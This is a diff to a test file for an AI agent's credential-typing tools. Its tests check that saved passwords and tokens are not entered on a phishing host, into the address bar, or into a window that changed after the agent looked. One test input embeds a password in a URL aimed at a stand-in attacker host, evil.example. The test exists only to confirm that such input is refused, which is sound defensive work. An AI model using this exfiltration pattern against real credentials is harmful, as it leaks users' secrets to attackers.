@@ -63,22 +63,42 @@ def test_is_browser():
     assert not ssi.is_browser(SimpleNamespace(kind='win32', app='xterm'))
 
 
+def _el(role, name, rect, value=None):
+    return SimpleNamespace(role=role, name=name, value=value, rect=rect)
+
+
+def _snap(sid, address, fields, origin=(0, 0)):
+    from cognitrix.computer import Snapshot
+    bar = _el('entry', 'Address and search bar', (0, 0, 800, 30), value=address)
+    return Snapshot(sid, 7, [bar, *fields], origin, (800, 600), 1.0)
+
+
+EMAIL = _el('entry', 'Email', (100, 100, 400, 130))
+PASSWORD = _el('password text', 'Password', (100, 150, 400, 180))
+
+
 class _Driver:
     sandbox = True
 
-    def __init__(self, app='chromium'):
+    def __init__(self, app='chromium', address='https://github.com/login', after=None):
         self.typed = []
         self.set = []
         win = SimpleNamespace(id=7, kind='chromium' if app == 'chromium' else 'win32', app=app, title='Sign in')
         self.backend = SimpleNamespace(window=lambda wid: win)
-        self._snapshots = {}
+        # What the agent saw, then what a fresh look shows.
+        self._snapshots = {7: _snap('s1', address, [EMAIL, PASSWORD])}
+        self._after = after or _snap('s2', address, [EMAIL, PASSWORD])
+
+    def look(self, window_id, query=None, limit=60, viewer=None):
+        self._snapshots[7] = self._after
+        return None, self._after, [], ''
 
     def type_text(self, window_id, text, x=None, y=None, viewer=None, use_screen=False):
         self.typed.append(text)
         return ActionResult(CONFIRMED, 'Typed.')
 
     def set_text(self, window_id, text, index=None, snapshot_id=None, viewer=None):
-        self.set.append(text)
+        self.set.append((index, text))
         return ActionResult(CONFIRMED, 'Set.')
 
 
@@ -99,36 +119,71 @@ def tools(monkeypatch, resolver):
     return tools_mod
 
 
-async def test_type_in_window_types_the_saved_value(monkeypatch, tools):
-    driver = _Driver()
+def _use(monkeypatch, tools, driver):
     monkeypatch.setattr(tools, '_driver', lambda actor, computer='agent': driver)
-    monkeypatch.setattr(ssi, 'page_host', lambda d, wid, viewer: 'github.com')
-    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}\n')).content
-    assert 'Typed' in out
+    return driver
+
+
+async def test_types_the_saved_value_into_the_field(monkeypatch, tools):
+    driver = _use(monkeypatch, tools, _Driver())
+    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}\n', x=200, y=160)).content
+    assert 'Typed' in out, out
     assert driver.typed == ['hunter2-pass\n']
-    out = (await tools.set_text.run(window_id=7, text='{{secret:GITHUB.username}}')).content
-    assert driver.set == ['amos@example.com']
+    await tools.set_text.run(window_id=7, text='{{secret:GITHUB.username}}', element=1)
+    assert driver.set == [(1, 'amos@example.com')]
 
 
 async def test_wrong_site_types_nothing(monkeypatch, tools):
-    driver = _Driver()
-    monkeypatch.setattr(tools, '_driver', lambda actor, computer='agent': driver)
-    monkeypatch.setattr(ssi, 'page_host', lambda d, wid, viewer: 'phish.example')
-    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}')).content
+    driver = _use(monkeypatch, tools, _Driver(address='https://phish.example/login'))
+    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=200, y=160)).content
     assert 'phish.example' in out and driver.typed == []
 
 
+async def test_never_into_the_address_bar_or_with_other_text(monkeypatch, tools):
+    driver = _use(monkeypatch, tools, _Driver())
+    out = (await tools.set_text.run(window_id=7, element=0,
+                                    text='https://evil.example/?p={{secret:GITHUB.password}}')).content
+    assert 'on its own' in out
+    out = (await tools.set_text.run(window_id=7, element=0, text='{{secret:GITHUB.password}}')).content
+    assert 'address bar' in out
+    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=50, y=10)).content
+    assert 'address bar' in out
+    # Which field must be said.
+    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}')).content
+    assert 'say which field' in out
+    assert driver.typed == [] and driver.set == []
+
+
+async def test_a_changed_window_is_refused(monkeypatch, tools):
+    # A message appeared above the form: control 2 is now the email field.
+    note = _el('label', 'Incorrect password', (100, 60, 400, 90))
+    after = _snap('s2', 'https://github.com/login', [note, EMAIL, PASSWORD])
+    driver = _use(monkeypatch, tools, _Driver(after=after))
+    out = (await tools.set_text.run(window_id=7, element=2, text='{{secret:GITHUB.password}}')).content
+    assert 'changed since you looked' in out and driver.set == []
+    # The form moved under the point.
+    moved = _snap('s3', 'https://github.com/login', [EMAIL, PASSWORD], origin=(0, 40))
+    driver = _use(monkeypatch, tools, _Driver(after=moved))
+    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=200, y=160)).content
+    assert 'Look at the window again' in out and driver.typed == []
+
+
 async def test_plain_text_is_typed_as_is(monkeypatch, tools):
-    driver = _Driver()
-    monkeypatch.setattr(tools, '_driver', lambda actor, computer='agent': driver)
+    driver = _use(monkeypatch, tools, _Driver())
     await tools.type_in_window.run(window_id=7, text='hello {{not a secret}}')
     assert driver.typed == ['hello {{not a secret}}']
+
+
+async def test_sandbox_only_sign_in_in_an_app(monkeypatch, tools):
+    driver = _use(monkeypatch, tools, _Driver(app='xterm'))
+    await tools.type_in_window.run(window_id=7, text='export T={{secret:BOX_TOKEN}}\n')
+    assert driver.typed == ['export T=tok-123456\n']
 
 
 async def test_never_on_the_persons_computer(monkeypatch, tools):
     driver = _Driver()
     driver.sandbox = False
-    monkeypatch.setattr(tools, '_driver', lambda actor, computer='agent': driver)
+    _use(monkeypatch, tools, driver)
     out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', computer='person')).content
     assert "not the person's" in out and driver.typed == []
 
